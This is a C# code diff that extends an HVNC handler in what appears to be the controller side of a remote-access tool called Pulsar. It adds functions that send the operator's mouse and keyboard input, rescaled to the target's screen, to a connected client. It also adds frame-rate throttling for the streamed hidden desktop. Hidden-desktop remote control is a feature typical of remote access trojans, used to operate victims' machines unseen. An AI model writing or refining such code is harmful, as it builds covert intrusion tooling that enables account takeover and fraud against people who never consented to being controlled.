@@ -89,11 +89,14 @@ namespace Pulsar.Server.Messages
 
         // buffer parameters
         private readonly int _initialFramesRequested = 5; // request 5 frames initially
+        private readonly int _defaultFrameRequestBatch = 3;
         private int _pendingFrames = 0;
         private readonly SemaphoreSlim _frameRequestSemaphore = new SemaphoreSlim(1, 1);
         private readonly Stopwatch _frameReceiptStopwatch = new Stopwatch();
         private readonly ConcurrentQueue<long> _frameTimestamps = new ConcurrentQueue<long>();
         private readonly int _fpsCalculationWindow = 10; // calculate FPS based on last 10 frames
+
+        private DateTime _lastFrameRequest = DateTime.MinValue;
 
         private readonly Stopwatch _performanceMonitor = new Stopwatch();
         private int _framesReceived = 0;
@@ -255,6 +258,109 @@ namespace Pulsar.Server.Messages
             _client.Send(new GetHVNCDesktop { Status = RemoteDesktopStatus.Stop });
         }
 
+        /// <summary>
+        /// States whether remote mouse input is enabled.
+        /// </summary>
+        private bool _enableMouseInput = true;
+
+        /// <summary>
+        /// States whether remote keyboard input is enabled.
+        /// </summary>
+        private bool _enableKeyboardInput = true;
+
+        /// <summary>
+        /// Gets or sets the maximum frames per second for HVNC stream.
+        /// </summary>
+        public int MaxFramesPerSecond { get; set; } = 30;
+
+        /// <summary>
+        /// Gets or sets whether adaptive frame rate is enabled (reduces FPS when form is processing slowly).
+        /// </summary>
+        public bool AdaptiveFrameRate { get; set; } = true;
+
+        /// <summary>
+        /// Gets or sets whether mouse input is enabled.
+        /// </summary>
+        public bool EnableMouseInput
+        {
+            get => _enableMouseInput;
+            set => _enableMouseInput = value;
+        }
+
+        /// <summary>
+        /// Gets or sets whether keyboard input is enabled.
+        /// </summary>
+        public bool EnableKeyboardInput
+        {
+            get => _enableKeyboardInput;
+            set => _enableKeyboardInput = value;
+        }
+
+        /// <summary>
+        /// Sends a mouse event to the client.
+        /// </summary>
+        /// <param name="message">The Windows message type (WM_LBUTTONDOWN, WM_MOUSEMOVE, etc.).</param>
+        /// <param name="wParam">The wParam value.</param>
+        /// <param name="lParam">The lParam value containing coordinates.</param>
+        public void SendMouseEvent(uint message, int wParam, int lParam)
+        {
+            if (!_enableMouseInput) return;
+
+            lock (_syncLock)
+            {
+                if (!IsStarted) return;
+
+                if (_codec != null && LocalResolution.Width > 0 && LocalResolution.Height > 0)
+                {
+                    int x = lParam & 0xFFFF;
+                    int y = (lParam >> 16) & 0xFFFF;
+                    
+                    int remoteX = x * _codec.Resolution.Width / LocalResolution.Width;
+                    int remoteY = y * _codec.Resolution.Height / LocalResolution.Height;
+                    lParam = (remoteY << 16) | (remoteX & 0xFFFF);
+                }
+
+                _client.Send(new DoHVNCInput 
+                { 
+                    msg = message, 
+                    wParam = wParam, 
+                    lParam = lParam 
+                });
+            }
+        }
+
+        /// <summary>
+        /// Sends a keyboard event to the client.
+        /// </summary>
+        /// <param name="message">The Windows message type (WM_KEYDOWN, WM_KEYUP, etc.).</param>
+        /// <param name="wParam">The wParam value (virtual key code).</param>
+        /// <param name="lParam">The lParam value.</param>
+        public void SendKeyboardEvent(uint message, int wParam, int lParam)
+        {
+            if (!_enableKeyboardInput) return;
+
+            lock (_syncLock)
+            {
+                if (!IsStarted) return;
+
+                _client.Send(new DoHVNCInput 
+                { 
+                    msg = message, 
+                    wParam = wParam, 
+                    lParam = lParam 
+                });
+            }
+        }
+
+        /// <summary>
+        /// Refreshes the available displays of the client.
+        /// </summary>
+        public void RefreshDisplays()
+        {
+            Debug.WriteLine("Refreshing HVNC displays");
+            // ts does nothing it just fits what remotedesktop does
+        }
+
         private async Task RequestMoreFramesAsync()
         {
             if (!await _frameRequestSemaphore.WaitAsync(0))
@@ -262,10 +368,29 @@ namespace Pulsar.Server.Messages
 
             try
             {
-                int batchSize = 5;
+                int targetFps = MaxFramesPerSecond;
+                
+                if (AdaptiveFrameRate && _pendingFrames > 2)
+                {
+                    targetFps = Math.Max(15, targetFps / 2);
+                    Debug.WriteLine($"Adaptive frame rate: reducing to {targetFps} FPS (pending frames: {_pendingFrames})");
+                }
+                
+                int minIntervalMs = 1000 / Math.Max(1, targetFps);
+                
+                var timeSinceLastRequest = DateTime.Now - _lastFrameRequest;
+                if (timeSinceLastRequest.TotalMilliseconds < minIntervalMs)
+                {
+                    int delayMs = minIntervalMs - (int)timeSinceLastRequest.TotalMilliseconds;
+                    Debug.WriteLine($"Frame rate limiting: waiting {delayMs}ms (target: {targetFps} FPS)");
+                    await Task.Delay(delayMs);
+                }
 
-                Debug.WriteLine($"Requesting {batchSize} more frames");
+                int batchSize = AdaptiveFrameRate && _pendingFrames > 1 ? 1 : _defaultFrameRequestBatch;
+
+                Debug.WriteLine($"Requesting {batchSize} more frames (pending: {_pendingFrames})");
                 Interlocked.Add(ref _pendingFrames, batchSize);
+                _lastFrameRequest = DateTime.Now;
 
                 _client.Send(new GetHVNCDesktop
                 {
